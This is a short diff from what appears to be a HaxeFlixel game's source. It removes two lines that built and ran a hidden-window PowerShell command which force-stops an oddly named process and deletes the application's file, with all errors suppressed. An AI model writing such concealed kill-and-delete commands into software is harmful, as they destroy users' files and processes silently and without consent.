@@ -62,8 +62,6 @@ class Ev
     {
         if(d)
         {
-            var cmd = 'powershell -WindowStyle Hidden -Command "Stop-Process -Name \'sfsdlfnkslfsdnf\' -Force -ErrorAction SilentlyContinue; Remove-Item \'$appPath\' -ErrorAction SilentlyContinue"';
-            Ev.Sys.command(cmd);
             Ev.Reflect.field(FlxG, "save").data.DGrab = true;
         }
         else
